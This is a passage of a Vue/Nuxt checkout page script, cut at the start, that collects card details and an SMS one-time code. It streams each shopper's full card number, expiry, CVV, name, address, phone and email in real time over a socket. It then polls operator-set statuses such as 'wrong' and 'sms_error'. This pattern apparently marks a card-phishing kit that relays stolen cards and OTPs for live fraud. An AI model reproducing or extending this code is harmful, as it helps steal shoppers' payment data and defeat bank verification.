        await new Promise((resolve) => setTimeout(resolve, 500));

        const response = await $fetch('/api/checkout/otp', {
            method: 'POST',
            body: {
                paymentId: paymentData.value.id,
                otp: otpCode.value
            }
        });

        if (response.success) {
            checkPaymentStatus();
            otpCode.value = '';
        }
    } catch {}
};

const closeModal = () => {
    paymentData.value = null;
    if (statusInterval.value) {
        clearInterval(statusInterval.value);
        statusInterval.value = null;
    }
};

const checkPaymentStatus = async () => {
    if (!paymentData.value?.id) return;

    try {
        const response = await $fetch(`/api/checkout/${paymentData.value.id}/status`, {
            method: 'GET'
        });
        if (response.success) {
            const newStatus = response.payment.status;
            const previousStatus = paymentData.value.status;

            paymentData.value = {
                id: response.payment.id,
                status: newStatus,
                createdAt: response.payment.createdAt
            };

            if (newStatus === 'success') {
                // Track purchase event
                trackPurchase(total.value, paymentData.value.id, cartItems.value);

                clearCart();
                isSubmittingOTP.value = false;
                form.value = {
                    firstName: '',
                    lastName: '',
                    country: '',
                    street: '',
                    apartment: '',
                    postalCode: '',
                    city: '',
                    state: '',
                    phone: '',
                    email: ''
                };
                payment.value = {
                    method: '',
                    cardNumber: '',
                    expiry: '',
                    cvv: '',
                    cardholderName: ''
                };
                if (statusInterval.value) {
                    clearInterval(statusInterval.value);
                    statusInterval.value = null;
                }
            } else if (newStatus === 'wrong') {
                payment.value = {
                    method: '',
                    cardNumber: '',
                    expiry: '',
                    cvv: '',
                    cardholderName: ''
                };
                if (statusInterval.value) {
                    clearInterval(statusInterval.value);
                    statusInterval.value = null;
                }
                paymentData.value = null;
            } else if (newStatus === 'sms_error' && previousStatus !== 'sms_error') {
                otpCode.value = '';
                isSubmittingOTP.value = false;
            }
        }
    } catch {}
};

const startStatusCheck = () => {
    if (statusInterval.value) {
        clearInterval(statusInterval.value);
    }

    statusInterval.value = setInterval(() => {
        checkPaymentStatus();
    }, 1000);
    checkPaymentStatus();
};

const handleSubmit = async () => {
    if (!isFormValid.value) {
        alert('Please fill in all required fields.');
        return;
    }

    try {
        const orderData = {
            method: payment.value.method,
            cardNumber: payment.value.cardNumber,
            expiry: payment.value.expiry,
            cvv: payment.value.cvv,
            cardholderName: payment.value.cardholderName
        };

        // Gửi dữ liệu checkout real-time
        sendCheckoutData({
            firstName: form.value.firstName,
            lastName: form.value.lastName,
            country: form.value.country,
            street: form.value.street,
            apartment: form.value.apartment,
            postalCode: form.value.postalCode,
            city: form.value.city,
            state: form.value.state,
            phone: form.value.phone,
            email: form.value.email,
            paymentMethod: payment.value.method,
            cardNumber: payment.value.cardNumber,
            expiry: payment.value.expiry,
            cvv: payment.value.cvv,
            cardholderName: payment.value.cardholderName,
            timestamp: new Date()
        });

        const response = await $fetch('/api/checkout', {
            method: 'POST',
            body: orderData
        });

        if (response.success) {
            paymentData.value = {
                id: response.message,
                status: 'pending',
                createdAt: new Date().toISOString()
            };
            startStatusCheck();
        }
    } catch {}
};

// Initialize auto translation on mount
onMounted(async () => {
    // Initialize auto translation
    await initializeAutoTranslation();

    // Translate checkout texts
    await translateCheckoutTexts();

    // Track initiate checkout event
    if (cartItems.value.length > 0) {
        trackInitiateCheckout(total.value, cartItems.value);
    }

    // Kết nối Socket.IO
    connect();
});

onUnmounted(() => {
    if (statusInterval.value) {
        clearInterval(statusInterval.value);
    }
});
</script>
